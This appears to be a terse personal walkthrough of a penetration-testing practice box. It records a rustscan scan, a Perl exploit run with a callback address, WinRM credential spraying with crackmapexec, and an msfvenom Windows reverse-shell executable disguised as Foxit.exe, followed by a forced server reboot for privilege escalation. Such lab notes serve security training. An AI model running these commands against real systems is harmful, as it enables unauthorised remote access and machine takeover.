# export IP=192.168.243.44

### Rustscan
```
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP > rust_scan_raw.txt

cat rust_scan_raw.txt | grep -v unknown > rust_scan.txt
```

### FTP
no anonymous login

### Completely stuck, so go with writeups.

`./16145.pl 192.168.243.44 7778 192.168.49.243 6666` is not working

```
perl 16145.pl 192.168.243.44 7778 192.168.49.243 6666
```

### Try creds from sqlite
crackmapexec winrm $IP -u names.txt -p cooows


### Runas last try
c:\windows\syswow64\windowspowershell\v1.0\powershell.exe whoami



### Okay let's just get root then
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.243 LPORT=6667 -f exe -o Foxit.exe

shutdown -r -t 10 && exit
```

A good box that with special Privilege Escalation. It requires shutdown the server.